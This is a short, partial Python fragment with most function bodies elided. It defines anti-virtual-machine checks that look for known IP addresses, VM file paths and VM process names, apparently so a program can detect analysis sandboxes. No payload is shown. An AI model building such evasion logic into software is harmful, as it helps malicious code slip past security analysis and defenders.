def vmChecks_main(self, default_knownIps_list, default_vmpaths, default_vmProcesses):
    try:
        # check if "KnownIps" is enabled
        if "KnownIps" in self.anti_vm_checks:
            #  is enabled run check
            if KnownIpsCheck(self, default_knownIps_list):return True

        # check if "VMPaths" is enabled
        if "VMPaths" in self.anti_vm_checks:
            # is enabled run check
            if vmPathsCheck(self, default_vmpaths):return True

        # check if "ProcessNames" is enabled
        if "ProcessNames" in self.anti_vm_checks:
            # is enabled run check
            if ProcessNamesCheck(self, default_vmProcesses):return True
...
def KnownIpsCheck(self, default_knownIps_list):
    # get public IP (ipv4)
...
def vmPathsCheck(self, default_vmpaths):
...
def ProcessNamesCheck(self, default_vmProcesses):
    process_names = []
